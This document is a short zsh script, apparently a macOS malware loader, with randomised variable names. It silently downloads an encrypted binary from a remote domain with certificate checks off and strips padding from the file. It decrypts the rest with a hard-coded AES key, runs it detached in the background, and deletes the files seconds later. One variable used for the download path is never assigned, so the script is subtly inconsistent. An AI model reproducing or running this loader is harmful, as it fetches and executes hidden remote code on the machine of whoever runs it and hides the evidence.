#!/bin/zsh
knnnc=$(mktemp /tmp/c89zk4.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m121c26d4c1ab8217.bin" -o "$knnncz" || exit 1
vp72ra=$(stat -f %z "$knnncz"); p2y8pp9=$(( vp72ra - 2898 - 2452 ))
tail -c +$(( 2898 + 1 )) "$knnncz" | head -c $p2y8pp9 | openssl enc -d -aes-256-cbc -k 75471da2a131c90d974345a5 -out "$knnnc" 2>/dev/null
[ -s "$knnnc" ] && chmod 700 "$knnnc" && ( "$knnnc" & ) && disown
( sleep 3; rm -f "$knnnc" "$knnncz" ) &>/dev/null &
